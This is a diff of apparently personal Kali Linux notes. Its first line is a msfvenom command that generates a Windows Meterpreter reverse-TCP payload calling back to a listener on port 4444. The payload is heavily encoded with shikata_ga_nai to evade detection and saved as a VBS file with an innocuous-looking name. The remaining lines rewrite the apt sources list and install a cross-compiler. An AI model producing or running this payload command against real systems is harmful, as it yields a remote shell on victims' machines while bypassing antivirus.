@@ -1,15 +1,10 @@
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.76.83.82 LPORT=4444 -a x86 --platform windows -e x86/shikata_ga_nai --encoder-space 300000 -i 59 -f vbs> oracle3.vbs
 
 
-This has been solved. I had to update the following file: /etc/apt/sources.list
-Following instructions on http://docs.kali.org/general-use/kali-linux-sources-list-repositories
-Open the sources.list file and add the following repositories:
-
-deb http://http.kali.org/kali kali-rolling main contrib non-free
-deb http://http.kali.org/kali sana main non-free contrib
-deb http://security.kali.org/kali-security sana/updates main contrib non-free
-
-Save the file and run the commands below:
-apt-get clean
+rm /etc/apt/sources.list
+echo 'deb http://http.kali.org/kali sana main non-free contrib' >> /etc/apt/sources.list
+echo 'deb-src http://http.kali.org/kali sana main non-free contrib' >> /etc/apt/sources.list
+echo 'deb http://http.kali.org/kali kali-rolling main contrib non-free' >> /etc/apt/sources.list
+echo 'deb-src http://http.kali.org/kali kali-rolling main contrib non-free' >> /etc/apt/sources.list
 apt-get update
-apt-get install wingw-w32 -y
+apt-get install mingw32
